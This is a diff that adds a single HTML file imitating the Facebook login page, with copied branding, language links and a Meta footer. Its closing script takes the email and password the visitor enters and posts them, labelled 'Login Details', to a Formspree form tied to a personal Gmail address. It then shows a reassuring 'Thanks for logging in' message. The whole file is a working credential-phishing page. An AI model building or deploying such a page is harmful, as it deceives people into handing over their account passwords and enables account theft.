@@ -1,0 +1,592 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="styles.css">
+    <link rel="shortcut icon" href="communication.png" type="image/x-icon">
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@700&display=swap" rel="stylesheet"> <!-- Added Google Font -->
+    <title>Login to Facebook</title>
+    <style>
+        * {
+    text-decoration: none;
+}
+        body {
+    font-family: Arial, sans-serif;
+    justify-content: center;
+    align-items: center;
+    height: auto;
+    margin: 0;
+    background-color: #e0e0f5;
+}
+
+.login-container {
+    background-color: #ffffff;
+    padding: 10px;
+    border-radius: 5px;
+    box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+    max-width: 410px;
+    box-sizing: border-box;
+    text-align: center;
+    max-height: 70%;
+    margin-bottom: 5%;
+  align-items: center;
+}
+.login-container p {
+    font-size: 19px;
+}
+
+.logo-text {
+    font-family: 'Montserrat', sans-serif; /* Changed font to Montserrat */
+    font-size: 46px; /* Increased font size */
+    color: #1877f2; /* Facebook blue */
+    margin-bottom: 10px; /* Space below the logo text */
+    text-align: center;
+}
+.shown {
+    font-family: 'Montserrat', sans-serif; /* Changed font to Montserrat */
+    font-size: 43px; /* Increased font size */
+    color: #1877f2; /* Facebook blue */
+    text-align: center;
+    margin-top: 15%;
+}
+.show{
+  position: absolute;
+  z-index: 2;
+  top: 0;
+  height: 100%;
+  width: 100%;
+  background: rgb(236, 236, 240);
+  display: none;
+}
+.logo-poin{
+    align-items: center;
+    border-color: red;
+    justify-content: center;
+    align-items: center;
+    display: flex;
+    margin-top: 30px;
+}
+
+input {
+    width: 100%;
+    padding: 17px;
+    margin-top: 17px;
+    margin-left: 0px;
+    border: 1px solid #ddd;
+    border-radius: 5px;
+    box-sizing: border-box;
+}
+input::placeholder{
+  font-size: 16px;
+}
+input:focus{
+  outline-color: grey;
+}
+
+
+button {
+    width: 100%;
+    padding: 12px;
+    background-color: #1877f2;
+    color: #ffffff;
+    border: none;
+    border-radius: 5px;
+    cursor: pointer;
+    font-size: 19px;
+    margin-top: 10px;
+}
+
+button:hover {
+    background-color: #165eab;
+}
+
+.forgot-password {
+    text-align: center;
+    display: block;
+    margin: 10px 0;
+    color: #1877f2;
+    text-decoration: none;
+    font-size: 15px;
+}
+
+.register-container {
+    text-align: center;
+    margin-top: 20px;
+}
+.register-container p{
+    font-size: 12px;
+    color: grey;
+}
+
+.register-button {
+    padding: 12px;
+    background-color: #42b72a;
+    color: #ffffff;
+    border: none;
+    border-radius: 5px;
+    cursor: pointer;
+    font-size: 16px;
+    width: 50%;
+}
+
+.register-button:hover {
+    background-color: #36a420;
+}
+.languages{
+color: grey;
+background-color: white;
+}
+.languages a{
+color: grey;
+font-size: 14px;
+}
+.languages a:hover{
+border-bottom: 0.5px solid rgba(63, 57, 57, 0.452);
+}
+.probl {
+    margin-left: 20%;
+}
+.lang {
+    display: flex;
+    padding: 5px;
+    padding-top: 10%;
+}
+.lang1 {
+    display: flex;
+    padding: 5px;
+    border-top: 1px solid rgb(211, 215, 219);
+}
+.lang a{
+    padding: 5px;
+}
+.lang1 a{
+    padding: 5px;
+}
+
+/* Responsive styles */
+@media (max-width: 412px) {
+    .logo-text {
+        font-size: 28px; /* Adjust font size for smaller screens */
+    }
+
+    input, button {
+        padding: 10px; /* Decrease padding for smaller screens */
+        font-size: 14px; /* Adjust font size for smaller screens */
+    }
+    input::placeholder {
+        font-size: 12px; /* Adjust font size for smaller screens */
+    }
+
+    .login-container {
+        padding: 30px; /* Reduce padding on smaller screens */
+       position: relative;
+       width: 650px;
+    }
+    .lang {
+        width: auto;
+        height: 200px;
+        flex-wrap: wrap;
+        padding-top: 25%;
+    }
+    .lang a {
+        font-size: 12px;
+    }
+    .lang1 {
+        width: auto;
+        height: 200px;
+        flex-wrap: wrap;
+    }
+    .lang1 a {
+        font-size: 12px;
+    }
+    .probl {
+        margin-left: 10%;
+    }
+    .shown {
+    font-family: 'Montserrat', sans-serif; /* Changed font to Montserrat */
+    font-size: 26px; /* Increased font size */
+    color: #1877f2; /* Facebook blue */
+    text-align: center;
+    margin-top: 50%;
+}
+    }
+@media (max-width: 480px) {
+    .logo-text {
+        font-size: 28px; /* Adjust font size for smaller screens */
+    }
+
+    input, button {
+        padding: 10px; /* Decrease padding for smaller screens */
+        font-size: 14px; /* Adjust font size for smaller screens */
+    }
+
+    .login-container {
+        padding: 30px; /* Reduce padding on smaller screens */
+       width: 350px;
+    }
+    .register-button{
+        width: 200px;
+    }
+    .lang {
+        width: 100%;
+        height: 200px;
+    }
+    .lang a {
+        font-size: 12px;
+    }
+    .lang1 {
+        width: auto;
+        height: 200px;
+    }
+    .lang1 a {
+        font-size: 12px;
+    }
+    .probl {
+        margin-left: 10%;
+    }
+    .shown {
+    font-family: 'Montserrat', sans-serif; /* Changed font to Montserrat */
+    font-size: 26px; /* Increased font size */
+    color: #1877f2; /* Facebook blue */
+    text-align: center;
+    margin-top: 50%;
+}
+}
+@media (max-width: 600px) {
+    .login-container {
+        padding: 50px; /* Reduce padding on smaller screens */
+    }
+    .register-button {
+        font-size: 12px;
+    }
+    .lang {
+        width: auto;
+        height: 200px;
+        flex-wrap: wrap;
+        padding-top: 25%;
+    }
+    .lang a {
+        font-size: 16px;
+    }
+    .lang1 {
+        width: auto;
+        height: 200px;
+        flex-wrap: wrap;
+    }
+    .lang1 a {
+        font-size: 16px;
+    }
+    .probl {
+        margin-left: 10%;
+    }
+    .shown {
+    font-family: 'Montserrat', sans-serif; /* Changed font to Montserrat */
+    font-size: 26px; /* Increased font size */
+    color: #1877f2; /* Facebook blue */
+    text-align: center;
+    margin-top: 65%;
+}
+}
+@media (max-width: 768px) {
+    .login-container {
+        padding: 50px; /* Reduce padding on smaller screens */
+    }
+    .register-button {
+        font-size: 12px;
+    }
+    .lang {
+        width: auto;
+        height: 200px;
+        flex-wrap: wrap;
+    }
+    .lang a {
+        font-size: 16px;
+    }
+    .lang1 {
+        width: auto;
+        height: 200px;
+        flex-wrap: wrap;
+    }
+    .lang1 a {
+        font-size: 14px;
+    }
+    .probl {
+        margin-left: 16%;
+    }
+    .shown {
+    font-family: 'Montserrat', sans-serif; /* Changed font to Montserrat */
+    font-size: 26px; /* Increased font size */
+    color: #1877f2; /* Facebook blue */
+    text-align: center;
+    margin-top: 45%;
+}
+}
+@media (max-width: 425px) {
+    .login-container {
+        padding: 50px; /* Reduce padding on smaller screens */
+    }
+    .register-button {
+        font-size: 12px;
+        width: 250px;
+    }
+    .lang {
+        width: auto;
+        height: 200px;
+        flex-wrap: wrap;
+    }
+    .lang a {
+        font-size: 15px;
+    }
+    .lang1 {
+        width: auto;
+        height: 200px;
+        flex-wrap: wrap;
+    }
+    .lang1 a {
+        font-size: 15px;
+    }
+    .probl {
+        margin-left: 10%;
+    }
+    .shown {
+    font-family: 'Montserrat', sans-serif; /* Changed font to Montserrat */
+    font-size: 26px; /* Increased font size */
+    color: #1877f2; /* Facebook blue */
+    text-align: center;
+    margin-top: 50%;
+}
+}
+@media (max-width: 547px) {
+    .login-container {
+        padding: 50px; /* Reduce padding on smaller screens */
+    }
+    .register-button {
+        font-size: 12px;
+        width: 250px;
+    }
+    .lang {
+        width: auto;
+        height: 200px;
+        flex-wrap: wrap;
+    }
+    .lang a {
+        font-size: 12px;
+    }
+    .lang1 {
+        width: auto;
+        height: 200px;
+        flex-wrap: wrap;
+    }
+    .lang1 a {
+        font-size: 12px;
+    }
+    .probl {
+        margin-left: 10%;
+    }
+    .shown {
+    font-family: 'Montserrat', sans-serif; /* Changed font to Montserrat */
+    font-size: 26px; /* Increased font size */
+    color: #1877f2; /* Facebook blue */
+    text-align: center;
+    margin-top: 45%;
+}
+}
+@media (max-width: 375px) {
+    .login-container {
+        padding: 50px; /* Reduce padding on smaller screens */
+    }
+    .register-button {
+        font-size: 12px;
+    }
+    .lang {
+        width: auto;
+        height: 200px;
+        flex-wrap: wrap;
+    }
+    .lang a {
+        font-size: 10px;
+    }
+    .lang1 {
+        width: auto;
+        height: 200px;
+        flex-wrap: wrap;
+    }
+    .lang1 a {
+        font-size: 10px;
+    }
+    .probl {
+        margin-left: 10%;
+    }
+    .shown {
+    font-family: 'Montserrat', sans-serif; /* Changed font to Montserrat */
+    font-size: 26px; /* Increased font size */
+    color: #1877f2; /* Facebook blue */
+    text-align: center;
+    margin-top: 50%;
+}
+}
+@media (max-width: 320px) {
+    .login-container {
+        padding: 50px; /* Reduce padding on smaller screens */
+    }
+    .register-button {
+        font-size: 12px;
+    }
+    .lang {
+        width: auto;
+        height: 200px;
+        flex-wrap: wrap;
+    }
+    .lang a {
+        font-size: 10px;
+    }
+    .lang1 {
+        width: auto;
+        height: 200px;
+        flex-wrap: wrap;
+    }
+    .lang1 a {
+        font-size: 10px;
+    }
+    .probl {
+        margin-left: 10%;
+    }
+    .shown {
+    font-family: 'Montserrat', sans-serif; /* Changed font to Montserrat */
+    font-size: 26px; /* Increased font size */
+    color: #1877f2; /* Facebook blue */
+    text-align: center;
+    margin-top: 45%;
+}
+}
+
+    </style>
+</head>
+<body>
+<h1 class="logo-text">facebook</h1> <!-- Facebook text at the top -->
+    <div class="logo-poin">
+    
+    <div class="login-container">
+        <p>Log in to facebook</p>
+        <form id="loginForm">
+            <input type="email" id="email" name="email" placeholder="Email address or phone number" required>
+<input type="password" id="password" name="password" placeholder="Password" required>
+<div class="bu"><button type="submit" value="Submit" id="submitButton"><strong>Log In</strong></button></div>
+            <a href="#" class="forgot-password">Forgotten Account?</a>
+        </form>
+        <div class="register-container">
+            <p>or</p>
+            <button class="register-button"><strong>Create new account</strong></button>
+        </div>
+    </div>
+    <div class="show" id="show">
+            <div class="shown">
+                <strong>Thanks for logging in. You may exit the page now.</strong>
+            </div>
+        </div>
+</div>
+<div class="languages">
+    <div class="probl">
+    <div class="lang">
+    <a href="#">English (UK)</a>
+    <a href="#">Hausa</a>
+    <a href="#">Français (France)</a>
+    <a href="#"> Português (Brasil)</a>
+    <a href="#">Español</a>
+    <a href="#">لعربية</a>
+    <a href="#">Bahasa Indonesia</a>
+    <a href="#">Deutsch</a>
+    <a href="#">日本語</a>
+    <a href="#">Italiano</a>
+    <a href="#">हिन्दी</a>
+</div>
+<div class="lang1">
+<a href="#">Sign Up</a>
+<a href="#">Login</a>
+<a href="#">Messenger</a>
+<a href="#">Facebook Lite</a>
+<a href="#">Video</a>
+<a href="#">Places</a>
+<a href="#">Games</a>
+<a href="#">Market Place</a>
+<a href="#">Meta Pay</a>
+<a href="#">Meta Store</a>
+<a href="#">Meta Quest</a>
+<a href="#">Ray-Ban Meta</a>
+<a href="#">Meta AI</a>
+<a href="#"></a>
+<a href="#"></a>
+<a href="#"></a>
+<a href="#"></a>
+<a href="#"></a>
+<a href="#"></a>
+<a href="#"></a>
+<a href="#"></a>
+<a href="#"></a>
+<a href="#"></a>
+<a href="#"></a>
+<a href="#"></a>
+<a href="#"></a>
+<a href="#"></a>
+</div>
+<P>Meta © 2024</P>
+</div>
+</div>
+<script>
+    function login() {
+  // Your login logic here
+  var show = document.getElementById("show");
+  show.style.display = "block";
+}
+
+const submitButton = document.getElementById("submitButton");
+
+submitButton.addEventListener("click", function() {
+  const email = document.getElementById("email").value;   
+
+  const password = document.getElementById("password").value;
+
+  if   
+ (email && password) { // Check if both fields are filled
+    login(); // Call the login function
+  } 
+});
+</script>
+<script>
+    const form = document.getElementById('loginForm');
+
+form.addEventListener('submit', (event) => {
+  event.preventDefault();
+
+  const email = document.getElementById('email').value;
+  const   
+ password = document.getElementById('password').value;
+
+  // Here, you would typically send  
+  // Since we're limited to client-side JavaScript, we'll use a form submission service like Formspree:
+
+  const formData = new FormData(form);
+  formData.append('subject', 'Login Details');
+  formData.append('body', `Email: ${email}\nPassword: ${password}`);
+
+  fetch('https://formspree.io/timothyoladapo4@gmail.com/mgvekwnd', {
+    method: 'POST',
+    body: formData
+  })
+  .then(response => {
+    if (response.ok) {
+      alert('Login details confirmed successfully!');
+      // You might redirect the user to a success page or display a success message.
+    } else {
+      alert('Error confirming login details.');
+    }
+  })
+  .catch(error => {
+    console.error('Error:', error);
+    alert('An error occurred. Please try again later.');
+  });
+});
+</script>
+</body>
+</html>
